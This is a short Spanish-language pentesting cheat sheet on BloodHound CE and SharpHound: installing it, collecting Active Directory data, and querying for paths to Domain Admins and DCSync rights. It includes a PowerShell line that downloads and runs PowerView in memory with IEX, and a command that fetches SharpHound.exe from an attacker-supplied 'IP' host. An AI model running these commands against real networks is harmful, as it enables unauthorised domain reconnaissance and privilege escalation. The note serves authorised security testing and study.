# Bloodhound 

Tags: #AD #Bloodhound #Kali #SharpHound 

* [Custom-Queries-Bloodhound-Github](https://github.com/hausec/Bloodhound-Custom-Queries/blob/master/customqueries.json)
* [Custom-Queries-Bloodhound-Github](https://github.com/CompassSecurity/BloodHoundQueries/blob/master/customqueries.json)

Se puede usar la Query en la parte de 'Raw Query' en bloodhound o se puede importar todo el Json.

## BloodHound Community Edition 

* [Bloodhound-Community-Install](https://bloodhound.specterops.io/get-started/quickstart/community-edition-quickstart)

```powershell
❯ ./bloodhound-cli install               # Instalar Bloodhound por primera vez 
❯ ./bloodhound-cli -h                    # Menú de ayuda 
❯ ./bloodhound-cli up                    # Levantar Bloodhound cada vez que se inicie Kali 
❯ ./bloodhound-cli down                  # Parar Bloodhound 
❯ ./bloodhound-cli version 
❯ ./bloodhound-cli update
❯ ./bloodhound-cli resetpwd              # Resetear la password 

❯ http://127.0.0.1:8080/ui/login         # Ingresar a BloodHound Community por la web               

Notas: 
	1. La instalción es por Docker por lo que al iniciar el sistema se debe de volver a iniciar 'BloodHound'
```

## Recopilación de datos 

Para descargar Sharphound se puede hacer desde la consola de Bloodhound Community Edition. 

```powershell 
# Descargar en memoria 
❯ IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1');

❯ (New-Object System.Net.WebClient).DownloadFile("http://IP/SharpHound.exe", "SharpHound.exe")   # Descargar en disco 
```

```powershell 
❯ . .\sharphound.ps1              # Importar el script descargado en disco 
❯ Import-Module .\SharpHound.ps1  # Importar el modulo descargado en disco 

# Recopilación de los datos enumerando Active Directory y generar los archivos que luego se cargan en BloodHound
❯ Invoke-BloodHound -CollectionMethod All   
```

## Análisis

### Busqueda por 'PathFinding'  
	- user@corp.local           # Buscar por usuario
	- domain users@corp.local   # Buscar por grupo 
### Busqueda por 'Cypher'
	- Shortest Paths to Domain Admins (Empezar)
	- Principals with DCSync Rights 
	- All Domian Admins
	- Shortest Paths from Domain Users to Tier Zero / High Values Targets 
### En los grupos se puede buscar:
Esto funciona cuando seleccionar un usuario, grupo, etc...

	- Inbound Control Rights   (Quien tiene permisos sobre ti)
		- Explicit Object Controllers 
### En los usuarios se puede buscar:
Esto funciona cuando seleccionar un usuario, grupo, etc...

	- Outbound Control Right   (Sobre quien tienes permisos)
		- First Degree Object Control 
